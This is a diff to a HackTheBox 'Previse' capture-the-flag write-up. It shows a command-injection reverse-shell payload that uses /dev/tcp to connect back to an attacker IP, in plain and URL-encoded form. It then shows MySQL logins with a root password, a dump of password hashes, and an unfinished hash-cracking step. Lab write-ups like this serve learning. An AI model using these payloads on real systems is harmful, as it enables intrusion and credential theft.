@@ -191,10 +191,62 @@ delim=comma;ping%20-c%204%2010.10.16.23%20#
 > REVSHELL PAYLOAD
 
 ```
-delim=;bash -c 'bash -i >& /dev/tcp/10.10.16.23/1337 0>&1';
+;bash -c 'bash -i >& /dev/tcp/10.10.16.23/1337 0>&1';
 
-delim%3D%3Bbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E23%2F1337%200%3E%261%27%3B
+%3Bbash%20%2Dc%20%27bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E23%2F1337%200%3E%261%27%3B
 ```
+
+> GOT SHELL
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/f13f53f3-40d4-4f98-8175-127e5f966ab9)
+
+
+25. Sadly we can't get the user flag.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/7bb914ec-2b7a-4e47-9fc5-3c58e52e51b8)
+
+
+26. Let's use the mysql cred we got before.
+27. Anyway the shell is not stable, everytime you ran sql syntax, it executes the command then terminate the shell.
+28. There's two ways to fix this, make the shell stable or use `-e` flag.
+
+![image](https://github.com/jon-brandy/hackthebox/assets/70703371/88726b5b-4513-4bdd-828e-eeb4357bb6b3)
+
+
+29. Long story short, found creds at --> previse database and accounts table.
+
+```
+www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
+<oot -p'mySQL_p@ssw0rd!:)' previse -e 'show tables;'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Tables_in_previse
+accounts
+files
+```
+
+```
+www-data@previse:/var/www/html$ mysql -h localhost -u root -p'mySQL_p@ssw0rd!:)' previse -e 'select * from accounts;'
+<L_p@ssw0rd!:)' previse -e 'select * from accounts;'
+mysql: [Warning] Using a password on the command line interface can be insecure.
+id      username        password        created_at
+1       m4lwhere        $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.        2021-05-27 18:18:36
+2       brandy  $1$🧂llol$QU5sYupds4bbeJz3SSAuj0        2023-10-14 07:21:53
+www-data@previse:/var/www/html$
+```
+
+30. Great! Let's crack the **m4lwhere** password using john.
+
+```
+┌──(brandy㉿bread-yolk)-[~]
+└─$ hashid $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
+Analyzing '$🧂llol.'
+[+] Unknown hash
+```
+
+31. Stuck for a while, because hashid failed to identify the potential hash algorithm.
+32. Reviewing the source code again, 
+
+
 
 
 
